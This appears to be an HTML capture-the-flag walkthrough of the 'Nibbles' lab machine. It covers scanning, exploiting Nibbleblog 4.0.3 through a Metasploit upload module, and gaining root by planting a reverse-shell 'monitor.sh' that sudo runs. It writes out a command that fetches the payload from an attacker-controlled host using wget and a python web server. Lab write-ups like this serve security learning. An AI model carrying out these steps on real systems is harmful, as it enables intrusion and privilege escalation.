<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>VM - Nibbles</title>
</head><body>&nbsp; &nbsp; &nbsp; &nbsp; <b>Walktrough - Nibbles</b><br/>
<br/>
<br/>
<b><i>Linux Machine</i></b><br/>
<br/>
First, start a "<b>nmap -T4 -A -p- IPADDRESS"</b><br/>
<img src="file://c:\users\ex-novo\appdata\local\temp\tmpvp0wca\1.png" /><br/>
<img src="1.png" /><br/>
<br/>
<br/>
We can see that there is just a port 80 and a port 22 (SSH and Web Server)<br/>
<b>The Web Server is Apache httpd 2.4.18</b>&nbsp;and the OS is probably an<b>&nbsp;Ubuntu</b><br/>
<br/>
<br/>
<b>################################################################</b><br/>
<br/>
<br/>
<b>Web Server</b><br/>
<br/>
<br/>
We can search for an Apache exploit with <b>searchsploit</b>&nbsp;(later):<img src="file://c:\users\ex-novo\appdata\local\temp\tmpvp0wca\2.png" /><br/>
<img src="1 2.png" /><br/>
<br/>
<br/>
The first thing we can do is go to the web page:<br/>
<img src="file://c:\users\ex-novo\appdata\local\temp\tmpvp0wca\3.png" /><br/>
<img src="1 3.png" /><br/>
<br/>
<br/>
<br/>
<b>Wappalyzer:</b><br/>
<img src="file://c:\users\ex-novo\appdata\local\temp\tmpvp0wca\4.png" /><br/>
<img src="1 4.png" /><br/>
<br/>
<br/>
<br/>
Seriously: that is.<br/>
We can do a lot of things:<br/>
1) Use <b>Nikto</b>&nbsp;or <b>Nessus</b>&nbsp;for <b>Vulnerability Scanning</b><br/>
2) Use <b>Dirbuster</b>&nbsp;to know more about directories<br/>
3) Use <b>other tools</b>&nbsp;to get more information<br/>
<br/>
<br/>
First thing to do in this cases: visualize the source code:<br/>
<img src="file://c:\users\ex-novo\appdata\local\temp\tmpvp0wca\5.png" /><br/>
<img src="1 5.png" /><br/>
<br/>
<br/>
Seems that there are more web pages to discover.<br/>
Let's find out more about <b>/nibbleblog/</b>:<br/>
<img src="file://c:\users\ex-novo\appdata\local\temp\tmpvp0wca\6.png" /><br/>
<img src="1 6.png" /><br/>
<br/>
<br/>
<br/>
If we search more on Google, we see that is <b>nibbleblog</b>&nbsp;CMS!!<br/>
<img src="file://c:\users\ex-novo\appdata\local\temp\tmpvp0wca\7.png" /><br/>
<img src="1 7.png" /><br/>
<br/>
<br/>
<br/>
We can see if there is something on <b>searchsploit:</b><br/>
<img src="file://c:\users\ex-novo\appdata\local\temp\tmpvp0wca\8.png" /><br/>
<img src="1 8.png" /><br/>
<br/>
<br/>
<br/>
Got it!<br/>
We can see that there is a Remote exploit for 4.0.3 version.<br/>
It is a .rb file, so can be found trough Metasploit modules<br/>
<img src="file://c:\users\ex-novo\appdata\local\temp\tmpvp0wca\9.png" /><br/>
<img src="file://c:\users\ex-novo\appdata\local\temp\tmpvp0wca\10.png" /><br/>
<img src="1 9.png" /><br/>
<img src="2.png" /><br/>
<br/>
<br/>
<br/>
Searching for mode default pages of Nibblepage, we see that Nibbleblog have an Admin Page <b>(admin.php)</b>:<br/>
<img src="file://c:\users\ex-novo\appdata\local\temp\tmpvp0wca\11.png" /><br/>
<img src="1 10.png" /><br/>
<br/>
<br/>
<br/>
We can see to do something with <b>dirbuster</b>...<br/>
<img src="file://c:\users\ex-novo\appdata\local\temp\tmpvp0wca\12.png" /><br/>
<img src="1 11.png" /><br/>
<br/>
<br/>
<br/>
Or just roaming.<br/>
Roaming gave us the option page of Nibbleblog, with his version <b>(4.0.3)</b><br/>
<img src="file://c:\users\ex-novo\appdata\local\temp\tmpvp0wca\13.png" /><br/>
<img src="1 12.png" /><br/>
<br/>
<br/>
<br/>
Just go back to Metasploit and try some USERNAME / PASSWORD to get the exploit<br/>
<img src="1 16.png" /><br/>
<br/>
<img src="file://c:\users\ex-novo\appdata\local\temp\tmpvp0wca\14.png" /><br/>
<img src="file://c:\users\ex-novo\appdata\local\temp\tmpvp0wca\15.png" /><br/>
<img src="1 13.png" /><br/>
<br/>
<br/>
<br/>
<br/>
<br/>
The exploited uploaded a malicious php file in <b>Plugins -: Image</b>&nbsp;section.<br/>
We can see that <b>we are not root</b>, but <b>we have the OS version and we can search for privilege escalation</b><br/>
<img src="file://c:\users\ex-novo\appdata\local\temp\tmpvp0wca\16.png" /><br/>
<img src="1 14.png" /><br/>
<br/>
<br/>
<br/>
If we pop a <b>“shell”</b>&nbsp;we can see that <b>“sudo -l”</b>&nbsp;(what command you can do as sudo without a password) is aviable<br/>
<img src="file://c:\users\ex-novo\appdata\local\temp\tmpvp0wca\17.png" /><br/>
<img src="1 15.png" /><br/>
<br/>
<br/>
We can do a lot of things:<br/>
1) Try to privilege escalation on the OS (Ubuntu 4.4.0)<br/>
2) Try to exploit the OS (Ubuntu 4.4.0)<br/>
3) Search for Linux Script for Privilege Escalation<br/>
<br/>
We will try to use:<br/>
LinEnum.sh <a href="https://github.com/rebootuser/LinEnum">https://github.com/rebootuser/LinEnum</a><br/>
linuxprivchecker <a href="https://github.com/sleventyeleven/linuxprivchecker">https://github.com/sleventyeleven/linuxprivchecker</a><br/>
Netsec Linux Priv Escal <a href="https://netsec.ws/?p=309">https://netsec.ws/?p=309</a><br/>
<br/>
<br/>
Easiest way now to be root is ro run that file <b>"monitor.sh"</b>&nbsp;but the dir and the file are not there!!!<br/>
We can create the dirs and upload a file called <b>“monitor.sh”</b>&nbsp;as a reverse shell.<br/>
<br/>
REMEMBER TO EXECUTE THE FILE FROM THE WHOLE PATH ALLOWED WITH SUDO<br/>
OR WILL NOT WORK AS SUDO!!!<br/>
<br/>
With Meterpreter: <b>“upload file.sh /path/to/upload/”</b>&nbsp;command<br/>
With Linux shell: Use <b>“python -m SimpleHTTPServer 80”</b>&nbsp;on your machine<br/>
&nbsp;and get the file on victim Linux machine with<b>“wget KALI_IPADDRESS:80/PATH/TO/FILE.sh”</b><br/>
<img src="file://c:\users\ex-novo\appdata\local\temp\tmpvp0wca\18.png" /><br/>
<img src="file://c:\users\ex-novo\appdata\local\temp\tmpvp0wca\19.png" /><br/>
<img src="1 17.png" /><br/>
<br/>
<img src="2 2.png" /><br/>
</body></html>